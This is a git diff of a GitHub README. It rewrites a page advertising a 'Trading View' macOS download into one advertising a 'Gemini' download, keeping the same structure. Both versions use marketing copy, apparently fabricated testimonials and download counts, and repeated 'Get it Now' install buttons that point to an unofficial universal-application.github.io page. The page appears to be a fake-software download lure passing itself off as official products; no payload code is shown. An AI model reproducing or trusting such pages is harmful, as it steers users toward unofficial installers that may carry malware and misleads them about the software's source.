@@ -1,117 +1,117 @@
-# Trading View – Professional Market Charting and Analysis Platform
+# Gemini – Google AI Assistant with Workspace Integration
 
 <p align="center">
-  <img src="https://assets.streamlinehq.com/image/private/w_300,h_300,ar_1/f_auto/v1/icons/logos/tradingview-ax7sxe5lm8knfaxwcaldi.png/tradingview-nct7p51k07roxa6picopf.png?_a=DATAiZAAZAA0" width="150" alt="Trading View icon"/>
+  <img src="https://static.vecteezy.com/system/resources/previews/046/861/646/non_2x/gemini-icon-on-a-transparent-background-free-png.png" width="150" alt="Gemini icon"/>
 </p>
 
 <p align="center">
-  <a href="https://universal-application.github.io/.github/tradingView">
-    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Trading View"/>
+  <a href="https://universal-application.github.io/.github/gemini">
+    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Gemini"/>
   </a>
 </p>
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/Downloads-10.8k-brightgreen?style=flat"/></a>
-  <a href="#"><img src="https://img.shields.io/badge/Version-2025-blue?style=flat"/></a>
+  <a href="#"><img src="https://img.shields.io/badge/Downloads-5.1k-brightgreen?style=flat"/></a>
+  <a href="#"><img src="https://img.shields.io/badge/Version-2.0-blue?style=flat"/></a>
   <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
 </p>
 
 ---
 
-## 📄 Overview
+## 📋 Overview
 
-<a href="#">Trading View</a> serves the full range of market participants — from investors checking positions occasionally to professional traders running simultaneous analysis across dozens of instruments — through a platform that scales to each use level without requiring separate tools or subscriptions.
+<a href="#">Gemini</a> provides the deepest value for professionals whose workflows are organized around Google's ecosystem — where email, documents, spreadsheets, and calendar data all live in Google services and AI assistance that can read across those services produces qualitatively different results than assistance operating in isolation.
 
-The <a href="#">instrument screener</a> filters the complete universe of tradable securities by technical conditions, fundamental metrics, and custom criteria across equities, forex, cryptocurrency, futures, and indices. Identify instruments meeting specific setup conditions across thousands of options in seconds. <a href="#">Sector performance heatmaps</a> visualize performance distribution across market segments as color-coded grids, surfacing leadership and lagging areas without reading tabular data.
-
-<p align="center">
-  <img src="https://static.tradingview.com/static/bundles/tab-linking.ebba40a63297ef9a1b51.png" alt="Trading View screenshot"/>
-</p>
-
-<a href="#">Broker connectivity</a> links to supported broker accounts for order placement, position monitoring, and account management within the TradingView interface — trading from chart levels without switching to a separate platform. <a href="#">Community ideas feed</a> surfaces analysis published by other traders with chart markup and written commentary, searchable by instrument, timeframe, and methodology, with the ability to follow analysts whose approach aligns with your own.
-
-The <a href="#">organized watchlist system</a> groups instruments into labeled collections with live price data, percentage change, and one-click chart access. <a href="#">Economic calendar integration</a> marks scheduled macro releases and central bank decisions on charts as dated vertical markers, providing direct visual context for understanding which events drove historical price movements and anticipating volatility around upcoming scheduled releases.
-
----
-
-## 🔧 Key Features
-
-- <a href="#">Instrument screener</a> — technical fundamental custom filter
-- <a href="#">Heatmap visualization</a> — sector performance overview
-- <a href="#">Broker connectivity</a> — order entry from chart level
-- <a href="#">Community ideas</a> — published analysis discovery
-- <a href="#">Organized watchlists</a> — labeled live-data instrument groups
-- <a href="#">Economic calendar</a> — macro events on chart timeline
-- <a href="#">All asset classes</a> — equity forex crypto futures indices
-- <a href="#">Global real-time data</a> — multi-exchange live feeds
-
----
-
-## 🤝 Who Uses It
-
-- **Long-term investors** — portfolio monitoring and opportunity screening across global markets
-- **Cryptocurrency traders** — continuous multi-exchange monitoring across pairs and timeframes
-- **Forex traders** — currency pair correlation analysis with session timing and macro event context
-- **Quantitative researchers** — systematic strategy development backtesting and statistical evaluation
-
----
+The <a href="#">document analysis depth</a> processes entire lengthy reports, legal agreements, technical specifications, and research papers with accurate extraction of specific information, cross-document comparison, and synthesis of findings across distributed source material. <a href="#">Gems custom configuration</a> saves specialized AI persona setups with task-specific instructions, knowledge context, and behavioral guidelines — a code reviewer, a writing editor, a financial analyst — each ready to apply instantly without re-establishing context.
 
 <p align="center">
-  <img src="https://static.tradingview.com/static/bundles/app-view.cb6d45c43bcf89257771.png" alt="Trading View screenshot 2"/>
+  <img src="https://lh3.googleusercontent.com/47pwh3xj6nu9qo2izvmQ4CI9Ios2zQk-MOzqD0TBfBbY0uNT8RQmBnHZZbP3YajukE9JrJ2cMqCf4KR1wZoT2T5FTyiDuoNpVQ98=e365-pa-nu-s0" alt="Gemini screenshot"/>
 </p>
 
-## 🏢 Where It's Useful & Additional Information
+<a href="#">Image generation through Imagen</a> produces original visuals from text descriptions within the same interface used for analysis and writing, covering product mockups, presentation illustrations, and creative visual concepts without switching to a separate tool. <a href="#">Audio and video understanding</a> processes spoken recordings, meeting audio, and video content for transcription, summary, and analytical question-answering.
 
-`Professional trading desks` · `Portfolio management` · `Quantitative research` · `Retail investing` · `Crypto portfolios` · `Systematic trading` · `Trading education` · `Financial journalism` · `Investment newsletters` · `Market commentary`
-
-The backtesting capability is where TradingView delivers its clearest financial value. Testing whether a trading approach actually produces positive expectancy in historical data — with realistic commission and slippage rather than theoretical clean execution — costs nothing beyond the time to write the Pine Script. Trading the same approach live without testing first costs real capital. The difference between these two paths is the expected value gap that disciplined testing closes. Making that testing accessible to every trader without specialized software or data infrastructure is TradingView's most consequential contribution to retail trading outcomes.
-
-> *"The screener finds my specific setup across 500 instruments in seconds. My previous process was manually reviewing charts for an hour every morning. That time is gone."* — Yuki T., Swing Trader
-
-> *"Economic calendar on the chart is the feature more traders should use. Seeing exactly which price moves coincide with which scheduled releases on the same chart changed how I think about macro impact."* — Dana R., Macro Analyst
+The <a href="#">agentic task connectivity</a> links Gemini to external tools and services for objectives requiring action beyond text generation — searching the web, executing code, accessing connected applications, and producing outputs in external systems. <a href="#">Multi-turn conversation depth</a> sustains full context across extended interactions, supporting sophisticated progressive reasoning that builds toward complex conclusions across many exchanges rather than resetting with each question.
 
 ---
 
-## 💾 Installation Instructions
+## 🛠️ Key Features
+
+- <a href="#">Full document analysis</a> — lengthy reports legal papers
+- <a href="#">Gems configuration</a> — custom AI persona presets
+- <a href="#">Imagen generation</a> — text to original visual
+- <a href="#">Audio video understanding</a> — transcription and analysis
+- <a href="#">Agentic connectivity</a> — actions in external tools
+- <a href="#">Multi-turn coherence</a> — progressive complex reasoning
+- <a href="#">Spreadsheet interrogation</a> — Sheets data queried directly
+- <a href="#">Cross-document synthesis</a> — comparison across file sets
+
+---
+
+## 🙋 Who Uses It
+
+- **Content creators** — writing assistance image generation and structured content production
+- **Legal professionals** — contract analysis document comparison and regulatory research
+- **Educators** — course material generation explanation scaffolding and assessment creation
+- **Executive teams** — report drafting briefing preparation and cross-document intelligence
+
+---
+
+<p align="center">
+  <img src="https://i.pcmag.com/imagery/articles/01uh3XydMJNrJf0rJYNYrKc-1..v1776325290.png" alt="Gemini screenshot 2"/>
+</p>
+
+## 📍 Where It's Useful & Additional Information
+
+`Enterprise Google users` · `Creative agencies` · `Legal departments` · `Research organizations` · `Consulting practices` · `Product teams` · `Journalism` · `Healthcare admin` · `Policy research` · `Executive communications`
+
+The extended context window defines Gemini's upper capability boundary for document-intensive work. Professional tasks involving complete lengthy legal agreements, full technical specifications, entire research papers, or whole codebases require a model that can hold all of it in active context simultaneously. Models with smaller context limits require selective excerpting that introduces the risk of missing important sections. Gemini's capacity to process these documents completely, without requiring the user to judge which parts matter before understanding the whole, is what makes it suitable for serious professional document work rather than only conversational assistance.
+
+> *"Gems for recurring task types eliminate setup time completely. My document reviewer Gem has the evaluation criteria and style guidelines pre-loaded. Drop in the document, get structured feedback immediately."* — Amelia W., Editorial Director
+
+> *"Image generation inside the same interface I use for analysis is more useful than I expected. I draft the content and generate the accompanying visual in the same session without switching tools."* — Bruno T., Marketing Lead
+
+---
+
+## 🚀 Installation Instructions
 
 1. Go to the installation site using the button above.
-2. Follow the on-screen instructions to install **Trading View** on your Device.
+2. Follow the on-screen instructions to install **Gemini** on your Device.
 
 <p align="center">
 
-[![Get it Now Trading View](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://universal-application.github.io/.github/tradingView)
+[![Get it Now Gemini](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://universal-application.github.io/.github/gemini)
 
 </p>
 
 ---
 
-## 🙋 FAQ
+## ❓ FAQ
 
 <details>
-<summary>Which markets and exchanges does TradingView provide data for?</summary>
+<summary>What are Gems and how are they created?</summary>
 
-Major global equity exchanges, forex pairs, cryptocurrency across leading exchanges, futures, indices, bonds, and economic data streams. Coverage depth and real-time availability varies by market and plan level.
+Gems are saved AI configurations with specific instructions, knowledge context, and behavioral guidelines. Create a Gem by defining the persona and instructions, then access it from the interface without re-establishing context in each session.
 
 </details>
 
 <details>
-<summary>How does the community ideas feature work?</summary>
+<summary>Can Gemini process audio and video content?</summary>
 
-Traders publish chart analysis with markup and written commentary that appears in a searchable feed. Analysis is filterable by instrument, timeframe, strategy type, and author. Following specific publishers brings their publications into a personal feed.
-
-</details>
-
-<details>
-<summary>How much historical data is available for Pine Script backtesting?</summary>
-
-Historical depth varies by instrument and plan. Major instruments provide years of daily data on standard plans and extended history on premium tiers. Intraday historical depth depends on the exchange and plan level.
+Audio transcription, reasoning across audio files, and video content understanding are supported on capable plan tiers. Processing quality depends on file format, duration, and plan level.
 
 </details>
 
 <details>
-<summary>Can charts be exported for use in external reports?</summary>
+<summary>How does the Python code execution feature work?</summary>
 
-Yes. Charts export as images from the interface. Published charts generate shareable links viewable without a TradingView account. Both formats work for inclusion in reports and presentations.
+Gemini writes and executes Python code within the conversation for data analysis, visualization, and mathematical computation. Standard data science libraries are available for analysis and charting within the execution environment.
+
+</details>
+
+<details>
+<summary>Does Gemini maintain conversation memory across sessions?</summary>
+
+Yes. Conversation history persists and is accessible. Memory features on supported plans retain specific designated information for application across future conversations.
 
 </details>
 
